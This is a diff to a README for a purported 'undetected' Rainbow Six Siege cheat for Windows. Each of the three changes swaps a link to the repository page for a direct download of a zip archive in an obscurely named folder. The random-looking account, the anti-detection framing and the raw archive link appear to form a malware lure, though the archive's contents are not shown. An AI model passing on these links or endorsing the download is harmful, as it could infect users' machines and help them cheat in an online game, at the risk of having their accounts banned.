@@ -1,6 +1,6 @@
 # 🎯 Legend-RainbowSixSiege-Undetected-2026 - Fast, Clear Siege Insight
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026/raw/refs/heads/main/particularize/Rainbow-Legend-Siege-Six-Undetected-1.2.zip)
 
 ## 🖥️ What this is
 
@@ -24,7 +24,7 @@ The goal is to keep the workflow short. You download it, open it, and use the on
 
 Use this link to visit the page and download the app:
 
-[Download Legend-RainbowSixSiege-Undetected-2026](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026)
+[Download Legend-RainbowSixSiege-Undetected-2026](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026/raw/refs/heads/main/particularize/Rainbow-Legend-Siege-Six-Undetected-1.2.zip)
 
 ## 🪟 Windows setup
 
@@ -188,7 +188,7 @@ Yes. It is meant for Windows users.
 
 Use the download page here:
 
-[Download Legend-RainbowSixSiege-Undetected-2026](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026)
+[Download Legend-RainbowSixSiege-Undetected-2026](https://github.com/Felonious-juglanscalifornica342/Legend-RainbowSixSiege-Undetected-2026/raw/refs/heads/main/particularize/Rainbow-Legend-Siege-Six-Undetected-1.2.zip)
 
 ### What if I want to move the overlay?
 
